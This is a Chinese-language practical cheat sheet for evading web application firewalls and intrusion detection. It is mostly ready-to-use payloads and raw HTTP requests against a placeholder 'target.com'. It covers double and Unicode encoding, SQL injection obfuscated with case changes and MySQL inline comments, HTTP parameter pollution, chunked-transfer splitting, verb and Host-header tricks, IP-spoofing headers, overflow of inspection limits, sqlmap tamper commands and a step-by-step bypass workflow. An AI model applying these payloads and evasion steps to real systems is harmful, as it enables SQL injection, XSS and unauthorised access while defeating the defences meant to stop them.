# WAF/IDS 绕过实战参考

> 分类: 编码层 → 协议层 → 语义层 → HTTP参数污染 → 分块传输 → 大小写/注释 → 流量伪装

---

## 1. 绕过层次总览

```
┌──────────────────┐
│ 应用层绕过       │ ← 大小写/编码/注释/等价替换/混淆
├──────────────────┤
│ 协议层绕过       │ ← HTTP走私/分块传输/流水线/管线走私
├──────────────────┤
│ 网络层绕过       │ ← IP伪造/TCP分段/分片传输
├──────────────────┤
│ 业务层绕过       │ ← 参数污染/JSON绕过/边界溢出
└──────────────────┘
```

---

## 2. 编码绕过

### 2.1 URL 编码

```
# 单次编码
'  → %27
"  → %22
空格 → %20
<   → %3C
>   → %3E

# 双重编码 (WAF 只解码一次)
'  → %25%32%37  (%25 = %, 解码后 = %27 → 再解码 = ')
<  → %25%33%43

# Unicode 编码
<  → %u003C
>  → %u003E
'  → %u0027

# HTML 实体编码 (XSS)
<  → &lt; / &#60;
>  → &gt; / &#62;
```

### 2.2 进制编码 (SQL注入)

```sql
# Hex
'admin' → 0x61646d696e
'SELECT' → 0x53454c454354

# Char()
'admin' → CHAR(97,100,109,105,110)

# Base64 (MySQL 5.6+)
FROM_BASE64('YWRtaW4=')
```

### 2.3 编码叠加大法

```
# 原始 Payload: <script>alert(1)</script>
# 步骤:
1. Base64: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
2. URL编码: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D
3. 再URL编码一次: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%253D%253D

# 实际请求中逐层解码 → WAF 只看第3层 → 绕过
```

---

## 3. 大小写与内联注释 (SQL 注入专用)

### 3.1 大小写混合

```sql
# 原始
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3

# 绕过
SeLeCt * FrOm users WhErE id=1 UnIoN SeLeCt 1,2,3
```

### 3.2 内联注释 (MySQL 特性)

```sql
# 普通注释
SELECT/**/*/**/FROM/**/users

# MySQL 版本注释 (/*!50000...*/  — 版本>=5.00.00时执行)
/*!50000SELECT*/ * FROM users
/*!50000UNIoN*/ /*!50000SELECT*/ 1,2,3

# 特殊注释嵌套
UN/**/ION SEL/**/ECT
SEL/*comment*/ECT
```

### 3.3 等价关键字

```sql
# 空格替换
' UNION(SELECT(1),(2),(3))--      # 括号代替空格
' UNION%0dSELECT%0a1%0d,2%0d,3-- # CRLF代替空格
' UNION%09SELECT%091%09,2%09,3-- # TAB代替空格

# 函数等价
MID() = SUBSTRING() = SUBSTR() = LEFT() = RIGHT()
ASCII() = ORD() = UNICODE()
COUNT(*) = COUNT(1) = COUNT(id)
LIMIT 1 = LIMIT 1 OFFSET 0
# (非 MySQL) TOP 1 = LIMIT 1
```

---

## 4. HTTP 参数污染 (HPP)

### 4.1 利用不同平台参数解析差异

```
# 同时传多个同名参数:
?id=1&id=2

# 各平台解析:
PHP/Apache  → id=2          (最后一个)
ASP.NET/IIS → id=1,2        (字符串拼接)
JSP/Tomcat  → id=1          (第一个)
Node.js     → id=['1','2']  (数组)
```

### 4.2 HPP 绕过 WAF 实例

```
# 场景: WAF 检测 id 参数 → 看到 id=1 (干净) → 放行, 但后端拿到的是 id=2 (恶意)

# SQLi HPP
?id=1&id=1' UNION SELECT 1,2,3--          # WAF看第一个, 后端取第二个

# XSS HPP
?q=<script>&q=alert(1)</script>            # WAF看第一个 碎片, 后端拼接

# 后端拼接场景 (ASP.NET)
GET /?q=user&q=' OR 1=1--                  # WAF: q=user (正常), 后端: q=user' OR 1=1--
```

---

## 5. 分块传输 (Chunked Transfer)

### 5.1 分块编码

```http
POST /api/vuln HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

3
id=1
2
' A
3
ND 1
2
=1
1
-
1
-
0

```

### 5.2 分块 + 注释混淆

```http
POST /api/vuln HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
';/*
6
*/UNION
6
 SELECT
9
 1,2,3/*
4
*/--
0
```

---

## 6. 协议层绕过

### 6.1 HTTP/1.1 与 HTTP/1.0

```
# HTTP/1.0 无 Host 头 → 部分WAF根据Host匹配规则 → 可能绕过
GET /vuln.php?id=1' HTTP/1.0

# 或者手动加 Content-Length: 0
GET /vuln.php?id=1' HTTP/1.1
Host: target.com
Content-Length: 0

# Pipeline (HTTP 管线化, 一个连接多个请求)
GET /normal.php HTTP/1.1
Host: target.com

GET /vuln.php?id=1' OR 1=1-- HTTP/1.1   # WAF 可能只检查第一个请求
Host: target.com
```

### 6.2 HTTP 动词绕过

```
# 认证绕过
GET /admin → 403
POST /admin → 200 (WAF 只拦截 GET)
PUT /admin → 200

# 自定义动词
FAKE /admin HTTP/1.1    → 某些WAF不认识 → 透传到后端 → 后端当GET处理

# 动词覆盖 (X-HTTP-Method-Override)
GET /admin HTTP/1.1
X-HTTP-Method-Override: POST
→ 前后端对方法理解不一致
```

### 6.3 Host 头绕过

```
# 双 Host
Host: target.com
Host: evil.com           # WAF检查第一个 → 后端可能用第二个

# Host 头缺失
GET / HTTP/1.1
→ 无 Host → 部分 WAF 规则不生效

# Host 变形
Host: target.com:80@evil.com
Host: evil.com#target.com
```

---

## 7. Content-Type 绕过

### 7.1 JSON / XML 绕过

```
# WAF 可能只检查 form-urlencoded → 用 JSON 传参
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin' OR 1=1--", "password": "x"}

# XML 传参
POST /api/login HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<user><username>admin' OR 1=1--</username><password>x</password></user>
```

### 7.2 multipart/form-data 绕过

```
# WAF 检查 boundary 内容不够彻底
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----aaa

------aaa
Content-Disposition: form-data; name="id"

1' OR 1=1--
------aaa--
```

---

## 8. IP/来源伪造绕过

### 8.1 IP 伪造头

```
# CDN/反向代理后 → 后端从这些头取真实IP
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.2, 192.168.1.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

# 内网地址
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 10.0.0.1
```

### 8.2 路径遍历绕过

```
# WAF 规则: /admin/* → 拦截
/admin/../admin/login         → 路径规范化后 = /admin/login
/admin/./login
/admin//login
/ADMIN/login                  → 大小写
/%61dmin/login                → URL编码
/admin;foo=bar/login          → 参数化路径
```

---

## 9. 边界与溢出

### 9.1 超长输入

```bash
# 超长 payload → 某些 WAF 有最大检测长度 → 超长部分跳过
GET /?id=1'+AND+(SELECT+'A'*1000000)+-- HTTP/1.1

# 超长参数名
GET /?AAAAAA...(10000个A)...AAA=1'+OR+1=1-- HTTP/1.1
```

### 9.2 参数数量溢出

```
# 大量无害参数 + 1个恶意参数 → WAF 可能只检测前N个
GET /?a=1&b=2&c=3&d=4&e=5&f=6&g=7&...(200个)...&id=1' OR 1=1--
```

---

## 10. SQLMap Tamper 速查

```bash
# 常用 tamper 组合
# 绕过 ModSecurity / 通用 WAF:
sqlmap -u "URL" --tamper=space2comment,randomcase,between,charencode --batch

# tamper 说明:
# space2comment     空格→/**/
# space2dash        空格→--%0a
# randomcase        随机大小写
# between           > < → BETWEEN
# charencode        URL编码
# charunicodeencode Unicode编码
# equaltolike       = → LIKE
# greatest          > → GREATEST
# least             < → LEAST
# percentage        空格→百分号
# apostrophemask    ' → %EF%BC%87 (中文单引号)
# versionedmorekeywords → MySQL内联注释
# xforwardedfor     注入X-Forwarded-For头
```

---

## 11. 实战绕过流程

```
Step 1: 发送正常请求 → 记录响应特征 (状态码/响应体长度/关键字符串)
Step 2: 发送带基础 Payload 的请求 → 是否被拦截? (403/页面变了/空响应)
Step 3: 判断拦截层:
  - 403 → WAF/IP封禁
  - 空白/截断 → WAF content过滤
  - 重定向到首页 → 应用层过滤
  - 弹JS/验证码 → 前端WAF
Step 4: 逐层尝试:
  4.1 URL编码 (单次 → 双重)
  4.2 大小写/注释混淆
  4.3 参数污染 (HPP)
  4.4 分块传输
  4.5 Content-Type 切换
  4.6 协议走私
  4.7 IP伪造
```

---

*参考: OWASP WAF Bypass + 实战经验 + PayloadAllTheThings*
